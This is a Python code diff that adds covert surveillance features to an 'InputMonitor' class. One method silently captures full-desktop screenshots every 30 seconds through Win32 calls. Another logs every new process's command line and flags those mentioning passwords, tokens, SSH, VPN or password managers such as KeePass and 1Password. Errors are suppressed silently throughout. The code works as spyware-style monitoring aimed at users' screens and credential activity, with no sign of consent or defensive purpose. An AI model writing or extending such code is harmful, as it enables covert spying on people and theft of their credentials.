@@ -467,6 +467,137 @@ class InputMonitor:
                 pass
             time.sleep(0.5)
 
+    # ====================================================================
+    #  SCREENSHOT CAPTURE
+    # ====================================================================
+
+    def _capture_screenshots(self, interval=30):
+        """Capture periodic screenshots of the user's desktop."""
+        screenshot_dir = os.path.join(self.log_dir, 'screenshots')
+        os.makedirs(screenshot_dir, exist_ok=True)
+
+        while self.running:
+            try:
+                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+                filepath = os.path.join(screenshot_dir, f'scr_{ts}.bmp')
+
+                # Win32 API screenshot — no external dependencies
+                hdesktop = user32.GetDesktopWindow()
+                width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
+                height = user32.GetSystemMetrics(1)   # SM_CYSCREEN
+
+                gdi32 = ctypes.windll.gdi32
+                hdc = user32.GetDC(hdesktop)
+                memdc = gdi32.CreateCompatibleDC(hdc)
+                hbitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
+                gdi32.SelectObject(memdc, hbitmap)
+                gdi32.BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)  # SRCCOPY
+
+                # Save to BMP using Win32 — no PIL needed
+                class BITMAPINFOHEADER(ctypes.Structure):
+                    _fields_ = [
+                        ('biSize', ctypes.c_uint32),
+                        ('biWidth', ctypes.c_int32),
+                        ('biHeight', ctypes.c_int32),
+                        ('biPlanes', ctypes.c_uint16),
+                        ('biBitCount', ctypes.c_uint16),
+                        ('biCompression', ctypes.c_uint32),
+                        ('biSizeImage', ctypes.c_uint32),
+                        ('biXPelsPerMeter', ctypes.c_int32),
+                        ('biYPelsPerMeter', ctypes.c_int32),
+                        ('biClrUsed', ctypes.c_uint32),
+                        ('biClrImportant', ctypes.c_uint32),
+                    ]
+
+                bmi = BITMAPINFOHEADER()
+                bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+                bmi.biWidth = width
+                bmi.biHeight = -height  # top-down
+                bmi.biPlanes = 1
+                bmi.biBitCount = 24
+                bmi.biCompression = 0
+                bmi.biSizeImage = width * height * 3
+
+                pixel_data = ctypes.create_string_buffer(bmi.biSizeImage)
+                gdi32.GetDIBits(memdc, hbitmap, 0, height, pixel_data, ctypes.byref(bmi), 0)
+
+                # Write BMP file
+                row_size = ((width * 3 + 3) // 4) * 4
+                bmp_size = 54 + row_size * height
+                with open(filepath, 'wb') as f:
+                    # BMP header
+                    f.write(b'BM')
+                    f.write(bmp_size.to_bytes(4, 'little'))
+                    f.write(b'\x00\x00\x00\x00')
+                    f.write((54).to_bytes(4, 'little'))
+                    # DIB header
+                    f.write((40).to_bytes(4, 'little'))
+                    f.write(width.to_bytes(4, 'little', signed=True))
+                    f.write(height.to_bytes(4, 'little', signed=True))
+                    f.write((1).to_bytes(2, 'little'))
+                    f.write((24).to_bytes(2, 'little'))
+                    f.write(b'\x00' * 24)
+                    f.write(pixel_data.raw)
+
+                # Cleanup GDI objects
+                gdi32.DeleteObject(hbitmap)
+                gdi32.DeleteDC(memdc)
+                user32.ReleaseDC(hdesktop, hdc)
+
+                self.stats['screenshots'] = self.stats.get('screenshots', 0) + 1
+                self._log_activity('screenshot', {'file': filepath, 'width': width, 'height': height})
+
+            except Exception:
+                pass
+
+            time.sleep(interval)
+
+    # ====================================================================
+    #  PROCESS MONITORING
+    # ====================================================================
+
+    def _monitor_processes(self, interval=10):
+        """Monitor for new process launches and their command lines."""
+        known_pids = set()
+        proc_log = os.path.join(self.log_dir, f'processes_{self.session_id}.jsonl')
+
+        # Initial snapshot
+        if HAS_PSUTIL:
+            for proc in psutil.process_iter(['pid']):
+                known_pids.add(proc.info['pid'])
+
+        while self.running:
+            try:
+                if HAS_PSUTIL:
+                    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'username', 'create_time']):
+                        pid = proc.info['pid']
+                        if pid not in known_pids:
+                            known_pids.add(pid)
+                            entry = {
+                                'ts': self._timestamp(),
+                                'type': 'process_start',
+                                'pid': pid,
+                                'name': proc.info.get('name', ''),
+                                'cmdline': ' '.join(proc.info.get('cmdline') or []),
+                                'user': proc.info.get('username', ''),
+                            }
+                            with open(proc_log, 'a', encoding='utf-8') as f:
+                                f.write(json.dumps(entry, ensure_ascii=False) + '\n')
+                            # Flag interesting processes
+                            cmdline_lower = entry['cmdline'].lower()
+                            if any(k in cmdline_lower for k in [
+                                'password', 'secret', 'token', 'ssh ', 'rdp',
+                                'vpn', 'keepass', 'lastpass', '1password',
+                                'putty', 'winscp', 'filezilla', 'ftp'
+                            ]):
+                                self._log_activity('interesting_process', entry)
+                else:
+                    # Fallback: Use WMI via PowerShell
+                    pass
+            except Exception:
+                pass
+            time.sleep(interval)
+
     def _periodic_flush(self):
         """Periodically flush buffers to disk."""
         while self.running:
